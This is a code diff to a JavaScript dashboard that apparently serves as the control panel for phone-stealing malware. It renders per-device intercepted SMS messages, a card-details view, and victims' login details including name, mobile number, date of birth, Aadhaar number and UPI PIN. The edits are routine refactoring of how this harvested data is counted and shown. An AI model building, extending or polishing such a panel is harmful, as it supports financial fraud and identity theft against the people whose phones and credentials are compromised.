@@ -28,6 +28,7 @@ function renderDevice(d) {
   const online = isDeviceOnline(d.last_seen);
   const statusClass = online ? "online" : "offline";
   const statusText = online ? "● Online" : "● Offline";
+  const msgCount = d.messages ? Object.keys(d.messages).length : 0;
 
   const html = `
     <div class="two-col-btns">
@@ -54,7 +55,7 @@ function renderDevice(d) {
     <button class="big-btn" onclick="openCardDetails()">💳 Card Details</button>
 
     <div class="section-card">
-      <h3>💬 Messages (${getMessagesCount(d)})</h3>
+      <h3>💬 Messages (${msgCount})</h3>
       <div id="recentMessages">
         <div style="text-align:center;color:#64748b;padding:20px;">Loading messages...</div>
       </div>
@@ -66,15 +67,7 @@ function renderDevice(d) {
 }
 
 // ==========================================
-// GET MESSAGES COUNT
-// ==========================================
-function getMessagesCount(d) {
-  if (!d.messages) return 0;
-  return Object.keys(d.messages).length;
-}
-
-// ==========================================
-// RENDER MESSAGES (from device_info/{id}/messages)
+// RENDER MESSAGES
 // ==========================================
 function renderMessages(messagesObj) {
   const el = document.getElementById("recentMessages");
@@ -92,11 +85,12 @@ function renderMessages(messagesObj) {
 
   msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
 
-  el.innerHTML = msgs.slice(0, 20).map((m) => {
+  el.innerHTML = msgs.slice(0, 30).map((m) => {
     const isSent = (m.type || "").toUpperCase() === "SENT";
     const fromTo = m.sender || m.number || m.receiver || "-";
     const body = m.body || m.message || "-";
-    const sim = m.receivedOn || m.sim_slot ? " · " + (m.receivedOn || ("SIM " + m.sim_slot)) : "";
+    const sim = m.receivedOn ? " · " + m.receivedOn : (m.sim_slot ? " · SIM " + m.sim_slot : "");
+    const timeStr = m.date || formatTime(m.timestamp);
 
     return `
       <div class="msg-item ${isSent ? 'sent' : ''}" style="margin-bottom:10px;">
@@ -105,7 +99,7 @@ function renderMessages(messagesObj) {
             <span class="msg-tag ${isSent ? 'tag-out' : 'tag-in'}">${isSent ? '📤 SENT' : '📩 RECV'}</span>
             ${escapeHtml(fromTo)}${escapeHtml(sim)}
           </span>
-          <span>${escapeHtml(m.date || formatTime(m.timestamp))}</span>
+          <span>${escapeHtml(timeStr)}</span>
         </div>
         <div class="msg-body">${escapeHtml(body)}</div>
       </div>
@@ -218,7 +212,7 @@ function updateSim() {
 }
 
 // ==========================================
-// LOGIN DETAILS (from device_info/{id}/login_details)
+// LOGIN DETAILS
 // ==========================================
 function openLoginDetails() {
   const el = document.getElementById("loginDetailsContent");
@@ -229,6 +223,7 @@ function openLoginDetails() {
   const mobile = ld.mobile || d.user_mobile || "-";
   const dob = ld.dob || d.user_dob || "-";
   const aadhar = ld.aadhar || d.user_aadhar || "-";
+
   let upiPin = d.upi_pin || ld.upi_pin || "-";
   if (typeof upiPin === "object" && upiPin !== null) {
     upiPin = upiPin.pin || upiPin.value || JSON.stringify(upiPin);
@@ -238,7 +233,7 @@ function openLoginDetails() {
     <div class="section-card" style="margin:0 0 12px 0;">
       <h3>👤 Personal Info</h3>
       <div style="font-size:13px;line-height:2;color:#fff;">
-        <div><b style="color:#94a3b8;">Name:</b> ${escapeHtml(name)}</div>
+        <div><b style="color:#94a3b8;">Name:</b> ${escapeHtml(String(name))}</div>
         <div><b style="color:#94a3b8;">Mobile:</b> ${escapeHtml(String(mobile))}</div>
         <div><b style="color:#94a3b8;">DOB:</b> ${escapeHtml(String(dob))}</div>
         <div><b style="color:#94a3b8;">Aadhar:</b> ${escapeHtml(String(aadhar))}</div>
